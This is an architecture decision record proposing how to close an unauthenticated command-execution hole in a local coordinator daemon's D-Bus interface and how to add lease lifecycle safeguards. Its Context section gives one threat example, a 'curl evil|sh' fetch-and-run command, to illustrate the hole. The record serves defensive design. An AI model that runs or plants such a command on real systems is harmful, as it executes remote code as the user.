# ADR-0012: Coordinator IPC trust model + lease lifecycle

- Status: Proposed (needs Corey's decision — changes the ADR-0006 plugin call contract)
- Date: 2026-06-16
- Relates to: ADR-0003 (fail-open), ADR-0006 (Hermes plugin → D-Bus lease), ADR-0010 (the daemon)
- Driver: [review scorecard 0005](../research/0005-coordinator-review-scorecard.md) findings
  S1 (Critical), H4 (High), M4 (Med) — deferred from the 2026-06-16 hardening pass because they
  are design decisions, not mechanical fixes.

## Context

`agentosd lease` (ADR-0010) is built and hardened, but three gaps are architectural, not bugs:

1. **S1 — the IPC boundary is open.** The daemon owns a *well-known name* on the **session bus**
   and `Spawn(tier, est, argv)` runs `argv` verbatim with **no caller authorization**. Any process
   in the session (a flatpak, a browser helper, a VS Code extension) can call
   `Spawn(best-effort, 0, ["sh","-c","curl evil|sh"])` → **arbitrary command execution as the user**.
   This is not live yet (no daemon is installed as a service), but it **must be closed before ship**.
2. **H4 — no lease lifecycle.** A cooperative `Acquire(interactive)` holder that crashes without
   `Release` holds the never-preemptible top tier **forever** → the overnight batch lane is wedged
   until restart. No peer-liveness, no TTL.
3. **M4 — no anti-strobe dwell.** Bursty interactive load can drive spawn→preempt→spawn churn
   (ComfyUI relaunch is expensive).

## Decision (proposed — pick per the options below)

### A. IPC trust (closes S1)
1. **Move off the shared session bus to a private peer socket.** Serve zbus peer-to-peer over a
   unix socket at `$XDG_RUNTIME_DIR/agentosd/coord.sock` (dir `0700`, socket `0600`); on accept,
   verify `SO_PEERCRED` uid == own uid. Only processes that can open a file you own can talk to it.
   *(Alternative if staying on the session bus: per-call `GetConnectionUnixUser == geteuid()` +
   an allowlist of caller bus names — weaker; the in-session confused-deputy remains.)*
2. **Replace caller-supplied `argv` with a static profile allowlist.** `Spawn(tier, est, profile,
   params)` where `profile ∈ {comfyui, dream-batch, …}` resolves to a **daemon-owned command
   vector** (model-proposes/code-disposes applied to IPC). The caller names an *intent*, never a
   binary. This closes the confused-deputy hole that uid-matching alone leaves open.
3. Keep the spawned child hardened (env scrubbed to a minimal set, explicit `current_dir`,
   `stdin=null`) — deferred from the hardening pass pending a test against real ComfyUI (full
   `env_clear` risks breaking the venv).

### B. Lease lifecycle (closes H4)
4. **Auto-release on holder disconnect.** Record the holder's unique bus name (or socket peer) at
   acquire; release its token on `NameOwnerChanged` / connection-close.
5. **Lease TTL + heartbeat** as a liveness backstop independent of transport: a holder renews
   within N seconds or the lease expires (fail-open: expiry frees the lane, never blocks interactive).
6. **Authorize who may take `interactive`** (the never-preemptible tier) — only the Hermes plugin.

### C. Anti-strobe (closes M4)
7. A per-tier **minimum dwell** in `LeaseState`: a just-preempted tier can't re-acquire for N
   seconds; the batch caller honors a backoff. Tie restore-to-idle to a dwell timer, not the instant
   of `Release`.

## Recommendation

Ship **A1 (private socket + SO_PEERCRED)** and **A2 (profile allowlist)** together — they close the
Critical with one architecture change and cost the least ongoing complexity. Add **B4 (peer-disconnect
auto-release)** in the same pass (cheap on a peer socket — it's just connection-close). Defer **B5
(TTL)**, **B6**, and **C7** to a follow-up once the Hermes plugin (ADR-0006) is real and we can see
the actual contention pattern.

## Open question for Corey

This changes the **ADR-0006 plugin call**: the plugin would open the private socket (not the session
bus) and call `Spawn(profile)` / `Acquire`, not `Spawn(argv)`. Confirm that's acceptable before
implementing — or, if the daemon will only ever be reachable by trusted local code you control and
never installed bus-wide, we could accept S1 as a documented risk and ship the lifecycle fixes only.

## Consequences

- Closes the unauthenticated-RCE surface without touching the (good) deterministic core, and without
  blocking interactive AI (ADR-0003 intact — inference runs via the gateway, not this exec path).
- The lease becomes crash-safe (no permanent lockout of the batch lane).
- `Spawn(argv)` as a general exec primitive over IPC is **removed** — the daemon owns its command
  vectors. Profiles are the new extension point (a profile is config the daemon reads, not an ADR).
